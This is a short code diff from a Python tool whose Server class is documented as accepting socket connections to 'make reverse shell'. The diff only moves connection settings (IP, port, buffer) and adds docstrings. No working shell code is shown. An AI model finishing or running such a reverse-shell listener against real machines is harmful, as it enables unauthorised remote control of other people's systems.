@@ -2,18 +2,21 @@ import socket, colorama
 from os import system
 from colorama import Fore as f
 
+class VARIABLES:
+    """ Connection variables for socket """
+    serverip  = "192.168.1.1" # your server/host ip
+    port      = 80 # port to connect to
+    buffer    = 1024 # buffer to send (in bytes)
+
 class C:
+    """ Program colors """
     colorama.init()
     RED = f.RED
     CYAN = f.CYAN
     ENDC = f.RESET
 
-class VARIABLES:
-    serverip  = "192.168.1.1" # your server/host ip
-    port      = 80 # port to connect to
-    buffer    = 1024 # buffer to send (in bytes)
-
 class Server:
+    """ Accept socket connections and make reverse shell """
     def __init__(self):
         self.ascii = f"""{C.RED}
 ▄▄▄ . ▌ ▐·▪  ▄▄▌   ▄▄▄·▪   ▄▄▄·
